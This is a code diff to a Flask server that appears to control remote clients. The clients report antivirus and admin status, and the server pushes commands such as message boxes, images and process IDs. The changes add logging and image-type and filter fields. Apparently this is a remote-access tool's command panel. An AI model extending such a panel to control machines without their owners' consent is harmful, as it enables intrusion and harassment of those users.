@@ -49,6 +49,10 @@ def heartbeat():
             "current_background_image": system_info.get('current_background_image', None)
         }
         print(f"Heartbeat from {client_id} (IP: {ip}). CPU: {system_info.get('cpu')}%. Memory: {system_info.get('memory_percent')}%. Uptime: {system_info.get('uptime')}. Antivirus: {system_info.get('antivirus')}. Admin: {system_info.get('is_admin')}. Clients online: {len(connected_clients)}")
+        if system_info.get('current_background_image'):
+            print(f"🖼️ Received background image data from {client_id}. Type: {system_info['current_background_image'].get('type')}, Size: {len(system_info['current_background_image'].get('data')) if system_info['current_background_image'].get('data') else 0} bytes.")
+        else:
+            print(f"🖼️ No background image data received from {client_id}.")
     return jsonify({"status": "ok"})
 
 @app.route('/send-command', methods=['POST'])
@@ -64,11 +68,13 @@ def send_command():
     monitor_index = data.get("monitor_index", 1) # Get monitor_index, default to 1
     image = data.get("image", None) # Get image, default to None
     pid = data.get("pid", None) # Get pid, default to None
+    image_type = data.get("image_type", "") # New: Get image_type, default empty string
+    filters = data.get("filters", None) # New: Get filters, default None
 
     if client_id and cmd:
         # Store all relevant command data including monitor_index and image
-        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid}
-        print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}', Icon: '{icon}', Buttons: '{buttons}', Top Most: {topmost}, Monitor Index: {monitor_index}, Image: {image is not None}) received.")
+        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters}
+        print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}', Icon: '{icon}', Buttons: '{buttons}', Top Most: {topmost}, Monitor Index: {monitor_index}, Image: {image is not None}, Image Type: {image_type}, Filters: {filters}) received.")
         return jsonify({"status": "success", "message": "Command received"}), 200
     print(f"Invalid command data received: {data}")
     return jsonify({"status": "error", "message": "Invalid command data"}), 400
@@ -104,6 +110,11 @@ def get_clients():
     #     del connected_clients[client_id]
 
     print(f"Returning {len(connected_clients)} connected clients (after offline check).")
+    for client_id, client_info in connected_clients.items():
+        if client_info.get('current_background_image'):
+            print(f"🖼️ Sending background image data for {client_id}. Type: {client_info['current_background_image'].get('type')}, Size: {len(client_info['current_background_image'].get('data')) if client_info['current_background_image'].get('data') else 0} bytes.")
+        else:
+            print(f"🖼️ No background image data available for {client_id} to send.")
     return jsonify(connected_clients)
 
 @app.route('/stream', methods=['POST'])
